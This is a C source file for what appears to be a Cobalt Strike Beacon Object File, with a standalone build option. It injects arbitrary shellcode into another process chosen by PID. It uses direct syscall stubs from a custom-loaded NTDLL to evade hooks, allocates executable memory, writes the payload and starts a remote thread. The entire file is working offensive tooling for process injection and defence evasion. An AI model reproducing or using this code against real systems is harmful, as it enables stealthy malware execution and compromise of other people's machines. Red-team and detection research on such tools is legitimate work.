#define _WIN32_WINNT 0x0600
#include <windows.h>
#include "beacon.h"
#include "bofdefs.h"
#include "ntdefs.h"
#include "base.c"
#include "injection.c"


DWORD ntcreatethread(PROCESS_INFORMATION* lpProcessInfo, LPBYTE lpShellcodeBuffer, DWORD dwShellcodeBufferSize)
{
    DWORD dwErrorCode = ERROR_SUCCESS;
    PHMOD hNTDLL = NULL;
    NtOpenProcess_t           NtOpenProcess = NULL;
    NtAllocateVirtualMemory_t NtAllocateVirtualMemory = NULL;
    NtWriteVirtualMemory_t    NtWriteVirtualMemory = NULL;
    NtCreateThreadEx_t        NtCreateThreadEx = NULL;
    NtWaitForSingleObject_t   NtWaitForSingleObject = NULL;
    NtFreeVirtualMemory_t     NtFreeVirtualMemory = NULL;
    NtClose_t                 NtClose = NULL;
    HANDLE hRemoteThread = NULL;
    LPVOID lpRemoteBuffer=NULL;
    LARGE_INTEGER liWaitTime;
    SIZE_T RegionSize = 0;
    
    // Custom LoadLibrary on NTDLL
    hNTDLL = _LoadLibrary(NTDLL_PATH);
    if(NULL == hNTDLL) { goto end; }

    // Get the syscall addresses
    NtOpenProcess           = (NtOpenProcess_t)GetSyscallStub(hNTDLL, "NtOpenProcess");
    NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetSyscallStub(hNTDLL, "NtAllocateVirtualMemory");
    NtWriteVirtualMemory    = (NtWriteVirtualMemory_t)GetSyscallStub(hNTDLL, "NtWriteVirtualMemory");
    NtCreateThreadEx        = (NtCreateThreadEx_t)GetSyscallStub(hNTDLL, "NtCreateThreadEx");
    NtWaitForSingleObject   = (NtWaitForSingleObject_t)GetSyscallStub(hNTDLL, "NtWaitForSingleObject");
    NtFreeVirtualMemory     = (NtFreeVirtualMemory_t)GetSyscallStub(hNTDLL, "NtFreeVirtualMemory");
    NtClose                 = (NtClose_t)GetSyscallStub(hNTDLL, "NtClose");
    /*
    internal_printf("NtOpenProcess           : %p\n", NtOpenProcess);
    internal_printf("NtAllocateVirtualMemory : %p\n", NtAllocateVirtualMemory);
    internal_printf("NtWriteVirtualMemory    : %p\n", NtWriteVirtualMemory);
    internal_printf("NtCreateThreadEx        : %p\n", NtCreateThreadEx);
    internal_printf("NtWaitForSingleObject   : %p\n", NtWaitForSingleObject);
    internal_printf("NtFreeVirtualMemory     : %p\n", NtFreeVirtualMemory);
    internal_printf("NtClose                 : %p\n", NtClose);
    */
    if( (NULL == NtOpenProcess) ||
        (NULL == NtAllocateVirtualMemory) ||
        (NULL == NtWriteVirtualMemory) ||
		(NULL == NtCreateThreadEx) ||
		(NULL == NtWaitForSingleObject) ||
		(NULL == NtFreeVirtualMemory) ||
		(NULL == NtClose)
    )
    {
        dwErrorCode = ERROR_PROC_NOT_FOUND;
        internal_printf("GetSyscallStub failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Allocating remote buffer
    RegionSize = dwShellcodeBufferSize + 1;
    dwErrorCode = NtAllocateVirtualMemory(
        lpProcessInfo->hProcess, 
        &lpRemoteBuffer, 
        0, 
        &RegionSize, 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE
    );
    if (STATUS_SUCCESS != dwErrorCode)
    {
        internal_printf("NtAllocateVirtualMemory failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Write the shellcode to the remote buffer
    RegionSize = dwShellcodeBufferSize;
    dwErrorCode = NtWriteVirtualMemory(
        lpProcessInfo->hProcess, 
        lpRemoteBuffer, 
        lpShellcodeBuffer, 
        RegionSize, 
        NULL
    );
    if (STATUS_SUCCESS != dwErrorCode)
    {
        internal_printf("NtWriteVirtualMemory failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Execute the remote buffer
    dwErrorCode = NtCreateThreadEx(
        &hRemoteThread, 
        THREAD_ALL_ACCESS, 
        NULL, 
        lpProcessInfo->hProcess, 
        (LPTHREAD_START_ROUTINE)lpRemoteBuffer, 
        NULL, 
        FALSE, 
        0, 
        0, 
        0, 
        NULL
    );
    if (STATUS_SUCCESS != dwErrorCode)
    {
        internal_printf("NtCreateThreadEx failed (%lu)\n", dwErrorCode);
        goto end;
    }
    
    // Waiting for thread to exit
    liWaitTime.QuadPart = INFINITE;
    NtWaitForSingleObject(
        hRemoteThread, 
        FALSE, 
        &liWaitTime
    );
    
end:

    if(hRemoteThread)
    {
        NtClose(hRemoteThread);
        hRemoteThread = NULL;
    }

    if(lpRemoteBuffer)
    {
        NtFreeVirtualMemory(
            lpProcessInfo->hProcess, 
            lpRemoteBuffer, 
            0, 
            MEM_RELEASE | MEM_DECOMMIT
        );
    }

    // Free the syscall stubs
    if(NtOpenProcess)
    {
        KERNEL32$VirtualFree(NtOpenProcess, 0, MEM_RELEASE);
        NtOpenProcess = NULL;
    }
    if(NtWriteVirtualMemory)
    {
        KERNEL32$VirtualFree(NtWriteVirtualMemory, 0, MEM_RELEASE);
        NtWriteVirtualMemory = NULL;
    }
    if(NtCreateThreadEx)
    {
        KERNEL32$VirtualFree(NtCreateThreadEx, 0, MEM_RELEASE);
        NtCreateThreadEx = NULL;
    }
    if(NtWaitForSingleObject)
    {
        KERNEL32$VirtualFree(NtWaitForSingleObject, 0, MEM_RELEASE);
        NtWaitForSingleObject = NULL;
    }
    if(NtFreeVirtualMemory)
    {
        KERNEL32$VirtualFree(NtFreeVirtualMemory, 0, MEM_RELEASE);
        NtFreeVirtualMemory = NULL;
    }
    if(NtClose)
    {
        KERNEL32$VirtualFree(NtClose, 0, MEM_RELEASE);
        NtClose = NULL;
    }

    _FreeLibrary(hNTDLL);
    hNTDLL = NULL;
    
    return dwErrorCode;
}


#ifdef BOF
VOID go( 
	IN PCHAR Buffer, 
	IN ULONG Length 
) 
{
    DWORD   dwErrorCode = ERROR_SUCCESS;
    datap   parser;
    DWORD   dwPid = 0;
    LPBYTE  lpShellcodeBuffer = NULL;
    DWORD   dwShellcodeBufferSize = 0;
    PROCESS_INFORMATION processInfo;

    MSVCRT$memset(&processInfo, 0, sizeof(PROCESS_INFORMATION));
    
    // Get the arguments <PID> <SHELLCODE>
    BeaconDataParse(&parser, Buffer, Length);
    dwPid = BeaconDataInt(&parser);
    lpShellcodeBuffer = (LPBYTE) BeaconDataExtract(&parser, (int*)(&dwShellcodeBufferSize));
	
    if(!bofstart())
    {
      return;
    }

    // Get a handle to the injection process
    internal_printf("GetInjectionHandle( %lu )\n", dwPid);
    dwErrorCode = GetInjectionHandle( dwPid, &processInfo );
    if (ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "GetInjectionHandle failed (%lu)\n", dwErrorCode);
		goto end;
    }

    // Execute our shellcode into the injection process
#ifndef __clang_analyzer__    
    internal_printf("ntcreatethread( %02x %02x %02x %02x ..., %lu )\n", 
        lpShellcodeBuffer[0], lpShellcodeBuffer[1], lpShellcodeBuffer[2], lpShellcodeBuffer[3],
        dwShellcodeBufferSize
    );
#endif    
    dwErrorCode = ntcreatethread(
        &processInfo, 
        lpShellcodeBuffer, 
        dwShellcodeBufferSize
    );
    if (ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "ntcreatethread failed (%lu)\n", dwErrorCode);
		goto end;
    }

    internal_printf("SUCCESS.\n");

end:

    // Clean up the injection process
    CloseInjectionHandle(&processInfo);

    printoutput(TRUE);
};
#else
int main(int argc, const char* argv[])
{
    DWORD   dwErrorCode = ERROR_SUCCESS;
    DWORD   dwPid = 0;
    LPBYTE  lpShellcodeBuffer = NULL;
    DWORD   dwShellcodeBufferSize = 0;
    PROCESS_INFORMATION processInfo;

    MSVCRT$memset(&processInfo, 0, sizeof(PROCESS_INFORMATION));

    // Check to see if we received any arguments
    if (3 != argc)
    {
        BeaconPrintf(CALLBACK_ERROR, "Invalid number of arguments\n");
        BeaconPrintf(CALLBACK_OUTPUT, "Usage: %s <PID> <SHELLCODE>\n", argv[0]);
        goto end;
    }

    // Get the arguments <PID> <SHELLCODE>
    dwPid = atoi(argv[1]);
    if (USHRT_MAX < dwPid)
    {
        BeaconPrintf(CALLBACK_ERROR, "Invalid PID: %s\n", argv[1]);
        BeaconPrintf(CALLBACK_OUTPUT, "Usage: %s <PID> <SHELLCODE>\n", argv[0]);
        goto end;
    }
    
    dwErrorCode = ReadFileIntoBuffer(argv[2], &lpShellcodeBuffer, &dwShellcodeBufferSize);
    if (ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "ReadFileIntoBuffer failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Get a handle to our injection process
    internal_printf("GetInjectionHandle( %lu )\n", dwPid);
    dwErrorCode = GetInjectionHandle( dwPid, &processInfo );
    if (ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "GetInjectionHandle failed (%lu)\n", dwErrorCode);
		goto end;
    }

    // Execute our shellcode into the injection process
#ifndef __clang_analyzer__        
    internal_printf("ntcreatethread( %02x %02x %02x %02x ..., %lu )\n", 
        lpShellcodeBuffer[0], lpShellcodeBuffer[1], lpShellcodeBuffer[2], lpShellcodeBuffer[3],
        dwShellcodeBufferSize
    );
#endif    
    dwErrorCode = ntcreatethread(
        &processInfo, 
        lpShellcodeBuffer, 
        dwShellcodeBufferSize
    );
    if (ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "ntcreatethread failed (%lu)\n", dwErrorCode);
		goto end;
    }

    internal_printf("SUCCESS.\n");

end:

    // Clean up the injection process
    CloseInjectionHandle(&processInfo);

    if(lpShellcodeBuffer)
    {
        intFree(lpShellcodeBuffer);
        lpShellcodeBuffer = NULL;
    }

    return dwErrorCode;
}
#endif